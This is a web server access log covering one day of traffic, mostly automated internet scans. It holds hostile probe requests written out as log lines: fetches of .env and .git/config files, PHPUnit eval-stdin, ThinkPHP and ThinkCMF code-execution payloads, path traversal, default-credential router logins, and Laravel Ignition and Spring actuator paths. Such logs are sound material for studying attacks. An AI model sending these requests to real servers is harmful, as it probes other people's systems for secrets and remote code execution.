18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /core/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /vendor/laravel/.env HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /storage/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /protected/.env HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /newsite/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /www/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:44 -0600] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:44 -0600] "GET /database/.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:44 -0600] "GET /public/.env HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:44 -0600] "GET /li2292-97.members.linode.com/.env HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:44 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:44 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
143.110.222.166 - - [14/Jan/2023:00:10:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.180.49.233 - - [14/Jan/2023:00:27:06 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
194.180.49.233 - - [14/Jan/2023:00:27:09 -0600] "GET ../../proc/ HTTP" 400 226 "-" "-"
205.185.118.237 - - [14/Jan/2023:00:51:45 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
113.142.141.105 - - [14/Jan/2023:01:03:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [14/Jan/2023:01:10:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [14/Jan/2023:01:55:14 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [14/Jan/2023:02:06:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [14/Jan/2023:02:25:31 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:02:25:31 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.100 - - [14/Jan/2023:02:34:19 -0600] "\x16\x03\x01\x01\xc0\x01" 400 226 "-" "-"
143.110.222.166 - - [14/Jan/2023:03:07:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.104.190.48 - - [14/Jan/2023:03:13:23 -0600] "GET / HTTP/1.0" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
59.89.160.148 - - [14/Jan/2023:03:30:12 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
167.99.180.253 - - [14/Jan/2023:03:33:52 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.155.126.211 - - [14/Jan/2023:03:39:06 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
42.230.225.106 - - [14/Jan/2023:04:04:04 -0600] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 301 291 "-" "-"
143.110.222.166 - - [14/Jan/2023:04:09:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
157.245.66.87 - - [14/Jan/2023:04:19:02 -0600] "\x16\x03\x01" 400 226 "-" "-"
157.245.66.87 - - [14/Jan/2023:04:19:02 -0600] "\x16\x03\x01" 400 226 "-" "-"
157.245.66.87 - - [14/Jan/2023:04:19:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
92.255.85.183 - - [14/Jan/2023:04:39:48 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [14/Jan/2023:05:08:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [14/Jan/2023:05:26:12 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:05:26:13 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.29 - - [14/Jan/2023:05:27:41 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
54.185.189.115 - - [14/Jan/2023:05:38:21 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko)"
34.76.158.233 - - [14/Jan/2023:05:48:09 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
143.110.222.166 - - [14/Jan/2023:06:06:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
188.166.87.67 - - [14/Jan/2023:06:34:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
143.110.222.166 - - [14/Jan/2023:07:06:39 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
87.236.176.55 - - [14/Jan/2023:07:49:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
185.224.128.219 - - [14/Jan/2023:07:58:35 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
185.224.128.219 - - [14/Jan/2023:08:00:48 -0600] "GET /admin/config.php HTTP/1.1" 301 248 "-" "python-requests/2.28.1"
143.110.222.166 - - [14/Jan/2023:08:06:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.219 - - [14/Jan/2023:08:07:59 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
185.224.128.219 - - [14/Jan/2023:08:10:03 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
185.224.128.219 - - [14/Jan/2023:08:14:51 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
185.180.143.136 - - [14/Jan/2023:08:15:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.8 - - [14/Jan/2023:08:17:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:08:24:30 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:08:24:32 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.57 - - [14/Jan/2023:08:25:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.185.118.237 - - [14/Jan/2023:08:26:45 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
137.220.228.75 - - [14/Jan/2023:08:29:51 -0600] "\x16\x03\x01\x01\t\x01" 400 226 "-" "-"
137.220.228.75 - - [14/Jan/2023:08:30:03 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
137.220.228.75 - - [14/Jan/2023:08:30:12 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
137.220.228.75 - - [14/Jan/2023:08:30:15 -0600] "GET /robots.txt HTTP/1.1" 301 242 "-" "Go-http-client/1.1"
137.220.228.75 - - [14/Jan/2023:08:30:32 -0600] "GET /sitemap.xml HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
193.47.61.76 - - [14/Jan/2023:08:52:20 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.22.0"
143.110.222.166 - - [14/Jan/2023:09:11:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.105.128.13 - - [14/Jan/2023:09:12:38 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.248.133.120 - - [14/Jan/2023:09:15:18 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.248.133.120 - - [14/Jan/2023:09:15:19 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.120 - - [14/Jan/2023:09:15:20 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [14/Jan/2023:10:06:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
68.162.80.21 - - [14/Jan/2023:10:16:49 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
205.210.31.139 - - [14/Jan/2023:10:34:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
104.152.52.98 - - [14/Jan/2023:10:35:24 -0600] "GET / HTTP/1.0" 301 233 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
80.94.92.57 - - [14/Jan/2023:10:47:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.246.220.11 - - [14/Jan/2023:10:53:38 -0600] "HEAD / HTTP/1.1" 301 - "-" "python-requests/2.28.1"
143.110.222.166 - - [14/Jan/2023:11:07:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [14/Jan/2023:11:24:55 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:11:24:56 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:11:54:35 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:12:05:34 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [14/Jan/2023:12:09:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [14/Jan/2023:12:17:24 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:12:24:09 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:12:29:28 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.243.149.13 - - [14/Jan/2023:12:36:58 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
194.38.20.161 - - [14/Jan/2023:12:46:15 -0600] "GET /administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php HTTP/1.1" 301 336 "-" "ALittle Client"
198.235.24.164 - - [14/Jan/2023:12:57:12 -0600] "GET / HTTP/1.0" 301 233 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
152.89.196.211 - - [14/Jan/2023:13:03:44 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [14/Jan/2023:13:07:25 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [14/Jan/2023:13:12:41 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:13:16:46 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.40.205 - - [14/Jan/2023:13:19:52 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.133.40.205 - - [14/Jan/2023:13:19:53 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:13:36:12 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.57 - - [14/Jan/2023:13:40:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [14/Jan/2023:13:43:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
154.89.5.222 - - [14/Jan/2023:13:51:23 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.142.122.213 - - [14/Jan/2023:14:06:36 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.170.248.16 - - [14/Jan/2023:14:08:28 -0600] "GET /hudson HTTP/1.1" 301 238 "-" "Mozilla/5.0 zgrab/0.x"
152.89.196.211 - - [14/Jan/2023:14:11:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:14:25:12 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:14:25:12 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [14/Jan/2023:14:29:46 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
173.214.175.178 - - [14/Jan/2023:14:50:58 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
113.108.9.38 - - [14/Jan/2023:15:03:08 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [14/Jan/2023:15:06:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.29 - - [14/Jan/2023:15:15:02 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
205.185.118.237 - - [14/Jan/2023:15:33:28 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
165.227.116.156 - - [14/Jan/2023:15:40:12 -0600] "GET /auth.asp HTTP/1.1" 301 240 "-" "Mozilla/5.0 zgrab/0.x"
2620:96:e000:b0cc:e:2:2:5 - - [14/Jan/2023:15:54:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:2:5 - - [14/Jan/2023:15:54:05 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [14/Jan/2023:16:02:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [14/Jan/2023:16:02:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.185.118.237 - - [14/Jan/2023:16:22:43 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.199.108.188 - - [14/Jan/2023:16:25:45 -0600] "GET /actuator/health HTTP/1.1" 301 247 "-" "Mozilla/5.0 zgrab/0.x"
159.203.192.9 - - [14/Jan/2023:16:25:45 -0600] "GET /portal/redlion HTTP/1.1" 301 246 "-" "Mozilla/5.0 zgrab/0.x"
2.230.219.196 - - [14/Jan/2023:16:54:58 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
2.230.219.196 - - [14/Jan/2023:16:54:58 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [14/Jan/2023:17:04:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2620:96:e000:b0cc:e:2:2:4 - - [14/Jan/2023:17:21:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:2:4 - - [14/Jan/2023:17:21:47 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
185.254.196.223 - - [14/Jan/2023:17:26:14 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:17:26:14 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
165.22.46.15 - - [14/Jan/2023:17:34:15 -0600] "GET /auth.asp HTTP/1.1" 301 240 "-" "Mozilla/5.0 zgrab/0.x"
103.237.174.238 - - [14/Jan/2023:17:44:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
151.245.7.28 - - [14/Jan/2023:17:49:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
143.110.222.166 - - [14/Jan/2023:18:03:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [14/Jan/2023:19:07:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
89.38.97.215 - - [14/Jan/2023:19:18:26 -0600] "HEAD / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.38.97.215 - - [14/Jan/2023:19:18:28 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.38.97.215 - - [14/Jan/2023:19:18:30 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.38.97.215 - - [14/Jan/2023:19:18:33 -0600] "GET /_profiler/phpinfo HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.38.97.215 - - [14/Jan/2023:19:18:35 -0600] "GET /debug/default/view?panel=config HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
